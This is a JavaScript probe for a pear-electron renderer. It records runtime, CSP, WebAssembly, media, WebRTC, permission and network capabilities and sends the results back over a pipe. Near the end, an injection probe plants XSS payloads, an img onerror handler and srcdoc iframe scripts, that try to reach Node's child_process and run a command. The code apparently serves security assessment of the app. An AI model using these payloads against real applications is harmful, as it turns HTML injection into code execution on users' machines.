// S1 renderer probe for a pre-v3 pear-electron runtime. Collects what Chromium offers, asks the
// Bare side for its loopback port over the pipe, tries <video> and MSE against that port, and
// sends one results object back as a newline-terminated JSON line.
const R = { started: Date.now() }
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
const err = (e) => String((e && (e.name ? e.name + ': ' : '') + (e.message || e)) || e)
function timeout (p, ms, what) {
  return Promise.race([p, sleep(ms).then(() => { throw new Error('timeout: ' + what) })])
}
const status = (s) => { const el = document.getElementById('status'); if (el) el.textContent = s }

async function getPipe () {
  try {
    const m = await import('pear-pipe')
    const p = (m.default || m)()
    if (p) return { pipe: p, via: "import('pear-pipe')" }
  } catch (e) {
    R.pearPipeImportError = err(e)
  }
  const P = globalThis.Pear
  const ipc = P && P[P.constructor.IPC]
  if (ipc && typeof ipc.pipe === 'function') return { pipe: ipc.pipe(), via: 'Pear[Pear.constructor.IPC].pipe()' }
  return { pipe: null, via: null }
}

function runtimeInfo () {
  const ua = navigator.userAgent
  R.userAgent = ua
  R.uaChrome = (/Chrome\/([\d.]+)/.exec(ua) || [])[1] || null
  R.uaElectron = (/Electron\/([\d.]+)/.exec(ua) || [])[1] || null
  R.typeofRequire = typeof require
  R.typeofProcess = typeof process
  if (typeof process !== 'undefined') {
    R.processVersions = { electron: process.versions.electron, chrome: process.versions.chrome, node: process.versions.node, v8: process.versions.v8 }
    R.processType = process.type
    R.processSandboxed = process.sandboxed
    R.processContextIsolated = process.contextIsolated
    R.rendererArgvHasNoSandbox = Array.isArray(process.argv) ? process.argv.includes('--no-sandbox') : null
    R.rendererArgvSandboxFlags = Array.isArray(process.argv) ? process.argv.filter((a) => /sandbox/.test(a)) : null
  }
  R.location = location.protocol + '//' + location.hostname + ':(port)' + location.pathname
  R.isSecureContext = window.isSecureContext
  R.crossOriginIsolated = window.crossOriginIsolated
  R.typeofPear = typeof globalThis.Pear
}

async function cspProbe () {
  const meta = document.querySelector('meta[http-equiv="Content-Security-Policy" i]')
  R.cspMeta = meta ? meta.getAttribute('content') : null
  try {
    const res = await timeout(fetch(location.href), 5000, 'self fetch')
    R.selfStatus = res.status
    R.selfHeaders = [...res.headers.keys()]
    R.cspHeader = res.headers.get('content-security-policy')
  } catch (e) { R.selfFetchError = err(e) }
  try { R.evalWorks = eval('1 + 1') === 2 } catch (e) { R.evalWorks = err(e) }
  try { R.newFunctionWorks = new Function('return 42')() === 42 } catch (e) { R.newFunctionWorks = err(e) } // eslint-disable-line no-new-func
  try {
    const s = document.createElement('script')
    s.textContent = 'window.__s1Inline = 1'
    document.head.appendChild(s)
    R.inlineScriptRuns = window.__s1Inline === 1
  } catch (e) { R.inlineScriptRuns = err(e) }
}

async function wasmProbe () {
  R.typeofWebAssembly = typeof WebAssembly
  if (typeof WebAssembly === 'undefined') return
  const empty = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00])
  R.wasmValidateEmpty = WebAssembly.validate(empty)
  // (module (func (export "f") (result i32) i32.const 42))
  const f42 = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00, 0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b])
  R.wasmValidateF42 = WebAssembly.validate(f42)
  try {
    const { instance } = await WebAssembly.instantiate(f42)
    R.wasmInstantiateF42 = instance.exports.f()
  } catch (e) { R.wasmInstantiateF42 = err(e) }
}

function mseProbe () {
  R.typeofMediaSource = typeof MediaSource
  R.typeofManagedMediaSource = typeof globalThis.ManagedMediaSource
  if (typeof MediaSource === 'undefined') return
  R.mseSupported = {}
  for (const t of ['video/mp4; codecs="avc1.64001f,mp4a.40.2"', 'video/mp4; codecs="avc1.42E01E"', 'audio/mp4; codecs="mp4a.40.2"', 'video/webm; codecs="vp9,opus"', 'video/mp4; codecs="hvc1.1.6.L93.B0"']) {
    R.mseSupported[t] = MediaSource.isTypeSupported(t)
  }
}

async function webrtcProbe () {
  R.typeofRTCPeerConnection = typeof RTCPeerConnection
  if (typeof RTCPeerConnection === 'undefined') return
  const pc1 = new RTCPeerConnection()
  const pc2 = new RTCPeerConnection()
  const cands = []
  try {
    pc1.onicecandidate = (e) => { if (e.candidate) { cands.push(e.candidate.candidate); pc2.addIceCandidate(e.candidate).catch(() => {}) } }
    pc2.onicecandidate = (e) => { if (e.candidate) pc1.addIceCandidate(e.candidate).catch(() => {}) }
    const dc = pc1.createDataChannel('s1')
    const got = new Promise((resolve) => { pc2.ondatachannel = (e) => { e.channel.onmessage = (m) => resolve(m.data) } })
    const opened = new Promise((resolve) => { dc.onopen = resolve })
    const offer = await pc1.createOffer()
    R.webrtcOfferHasSdp = typeof offer.sdp === 'string' && offer.sdp.startsWith('v=0')
    await pc1.setLocalDescription(offer)
    await pc2.setRemoteDescription(offer)
    const answer = await pc2.createAnswer()
    await pc2.setLocalDescription(answer)
    await pc1.setRemoteDescription(answer)
    await timeout(opened, 10000, 'datachannel open')
    dc.send('ping')
    R.webrtcLocalDataChannel = await timeout(got, 5000, 'datachannel message')
  } catch (e) {
    R.webrtcLocalDataChannel = err(e)
  } finally {
    R.webrtcCandidateKinds = cands.map((c) => {
      const p = c.split(' ')
      const addr = p[4] || ''
      return p[2] + '/' + p[7] + '/' + (addr.endsWith('.local') ? 'mdns' : addr.includes(':') ? 'ipv6' : 'ipv4')
    })
    pc1.close()
    pc2.close()
  }
}

function waitVideo (v, ms) {
  return new Promise((resolve) => {
    const t = setTimeout(() => resolve({ event: 'timeout' }), ms)
    v.addEventListener('loadedmetadata', () => { clearTimeout(t); resolve({ event: 'loadedmetadata' }) }, { once: true })
    v.addEventListener('error', () => { clearTimeout(t); resolve({ event: 'error', code: v.error && v.error.code, message: v.error && v.error.message }) }, { once: true })
  })
}

async function videoProbe (port) {
  const v1 = document.getElementById('v1')
  v1.src = `http://127.0.0.1:${port}/x.mp4`
  const r1 = await waitVideo(v1, 20000)
  R.video127 = { ...r1, readyState: v1.readyState, duration: v1.duration, width: v1.videoWidth, height: v1.videoHeight }
  if (r1.event === 'loadedmetadata') {
    try {
      await timeout(v1.play(), 5000, 'play')
      await sleep(1500)
      R.video127.playedTo = v1.currentTime
    } catch (e) { R.video127.play = err(e) }
  }
  const v2 = document.getElementById('v2')
  v2.src = `http://localhost:${port}/x.mp4`
  const r2 = await waitVideo(v2, 10000)
  R.videoLocalhostOtherPort = { ...r2, readyState: v2.readyState }
}

async function fetchProbes (port) {
  try {
    const res = await timeout(fetch(`http://127.0.0.1:${port}/x.mp4`, { headers: { Range: 'bytes=0-15' } }), 5000, 'fetch 127')
    R.fetch127 = { status: res.status, contentRange: res.headers.get('content-range') }
  } catch (e) { R.fetch127 = err(e) }
  try {
    const res = await timeout(fetch(`http://localhost:${port}/x.mp4`), 5000, 'fetch localhost')
    R.fetchLocalhostOtherPort = { status: res.status }
  } catch (e) { R.fetchLocalhostOtherPort = err(e) }
  try {
    const res = await timeout(fetch('https://example.com/'), 8000, 'fetch https')
    R.fetchExternalHttps = { status: res.status }
  } catch (e) { R.fetchExternalHttps = err(e) }
  R.webSocketWss = await new Promise((resolve) => {
    let ws
    const t = setTimeout(() => { try { ws.close() } catch {} resolve('timeout') }, 10000)
    try {
      ws = new WebSocket('wss://relay.damus.io')
      ws.onopen = () => { clearTimeout(t); ws.close(); resolve('open') }
      ws.onerror = () => { clearTimeout(t); resolve('error') }
    } catch (e) { clearTimeout(t); resolve(err(e)) }
  })
}

async function mseAppendProbe (port) {
  if (typeof MediaSource === 'undefined') return
  try {
    const buf = await (await fetch(`http://127.0.0.1:${port}/x.mp4`)).arrayBuffer()
    const ms = new MediaSource()
    const v = document.createElement('video')
    v.muted = true
    document.body.appendChild(v)
    v.src = URL.createObjectURL(ms)
    await timeout(new Promise((resolve) => ms.addEventListener('sourceopen', resolve, { once: true })), 5000, 'sourceopen')
    const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.64001f,mp4a.40.2"')
    await timeout(new Promise((resolve, reject) => {
      sb.addEventListener('updateend', resolve, { once: true })
      sb.addEventListener('error', () => reject(new Error('sourcebuffer error')), { once: true })
      sb.appendBuffer(buf)
    }), 10000, 'appendBuffer')
    const ranges = []
    for (let i = 0; i < sb.buffered.length; i++) ranges.push([sb.buffered.start(i), sb.buffered.end(i)])
    R.mseAppend = { bytes: buf.byteLength, buffered: ranges }
  } catch (e) { R.mseAppend = err(e) }
}

async function permissionProbe () {
  // No permission handlers are set in the main process: what does a page get without asking?
  try { R.notificationRequest = await timeout(Notification.requestPermission(), 5000, 'notification') } catch (e) { R.notificationRequest = err(e) }
  try { R.permissionsQueryNotifications = (await navigator.permissions.query({ name: 'notifications' })).state } catch (e) { R.permissionsQueryNotifications = err(e) }
  try {
    const s = await timeout(navigator.mediaDevices.getUserMedia({ audio: true }), 5000, 'getUserMedia')
    R.getUserMediaAudio = 'granted, tracks ' + s.getTracks().length
    s.getTracks().forEach((t) => t.stop())
  } catch (e) { R.getUserMediaAudio = err(e) } // NotFoundError = allowed but no device; NotAllowedError = denied
  try { R.clipboardReadText = typeof (await timeout(navigator.clipboard.readText(), 5000, 'clipboard')) } catch (e) { R.clipboardReadText = err(e) }
}

// What an HTML injection reaches: the shape of a Nostr note, a profile field or a video title that
// an app renders with innerHTML. Each payload is self-contained, as an attacker's would be, and
// runs `id` through Node's child_process if it can reach `require`. Harmless in the throwaway VM.
const PAYLOAD = "try{var r=(typeof require==='function')?'require: '+require('child_process').execFileSync('id',{encoding:'utf8'}).trim():'no require ('+typeof require+')'}catch(e){r='threw '+e.name+': '+e.message}"
const FRAME_SCRIPT = (tag) => "<script>var own=typeof require;try{var p=parent.require;var r=(typeof p==='function')?'parent.require: '+p('child_process').execFileSync('id',{encoding:'utf8'}).trim():'parent.require is '+typeof p}catch(e){r='threw '+e.name+': '+e.message}" +
  "parent.postMessage({s1frame:'" + tag + "',ownRequire:own,result:r,origin:String(location.origin)},'*')</script>"

async function injectionProbe () {
  const host = document.createElement('div')
  document.body.appendChild(host)
  host.innerHTML = '<img src="data:image/png;base64,AA==" onerror="' + PAYLOAD.replace(/"/g, '&quot;') + ';window.__s1inj=r">'
  await sleep(1000)
  R.injectionInnerHtmlImgOnerror = window.__s1inj === undefined ? 'handler did not run' : window.__s1inj

  const frames = {}
  const onMsg = (e) => { if (e.data && e.data.s1frame) frames[e.data.s1frame] = { ownRequire: e.data.ownRequire, result: e.data.result, origin: e.data.origin } }
  window.addEventListener('message', onMsg)
  for (const [tag, sandbox] of [['srcdoc-same-origin', null], ['srcdoc-sandbox-allow-scripts', 'allow-scripts']]) {
    const f = document.createElement('iframe')
    if (sandbox !== null) f.setAttribute('sandbox', sandbox)
    f.srcdoc = FRAME_SCRIPT(tag)
    document.body.appendChild(f)
  }
  await sleep(3000)
  window.removeEventListener('message', onMsg)
  R.injectionIframes = frames
}

async function main () {
  status('probing')
  runtimeInfo()
  const { pipe, via } = await getPipe()
  R.pipeVia = via
  if (!pipe) {
    console.log('S1R ' + JSON.stringify({ fatal: 'no pipe', ...R }))
    return
  }
  let buffered = ''
  const config = new Promise((resolve) => {
    pipe.on('data', (data) => {
      R.pipeChunkFromBare = { type: data && data.constructor && data.constructor.name, isString: typeof data === 'string', bytes: data && (data.byteLength ?? data.length) }
      buffered += typeof data === 'string' ? data : new TextDecoder().decode(data)
      const nl = buffered.indexOf('\n')
      if (nl !== -1) resolve(JSON.parse(buffered.slice(0, nl)))
    })
  })
  pipe.write(JSON.stringify({ type: 'hello', sent: Date.now() }) + '\n')
  let port = null
  try {
    const c = await timeout(config, 15000, 'config from Bare')
    port = c.videoPort
    R.pipeRoundTripMs = Date.now() - R.started
  } catch (e) { R.pipeConfig = err(e) }

  for (const [name, fn] of [['csp', cspProbe], ['wasm', wasmProbe], ['mse', mseProbe], ['webrtc', webrtcProbe], ['permission', permissionProbe], ['injection', injectionProbe]]) {
    try { await fn() } catch (e) { R[name + 'ProbeError'] = err(e) }
  }
  if (port) {
    for (const [name, fn] of [['video', videoProbe], ['fetch', fetchProbes], ['mseAppend', mseAppendProbe]]) {
      try { await fn(port) } catch (e) { R[name + 'ProbeError'] = err(e) }
    }
  }
  R.finished = Date.now() - R.started
  console.log('S1R ' + JSON.stringify(R))
  pipe.write(JSON.stringify({ type: 'results', results: R }) + '\n')
  status('done')
}

main().catch((e) => console.log('S1R ' + JSON.stringify({ fatal: err(e) })))
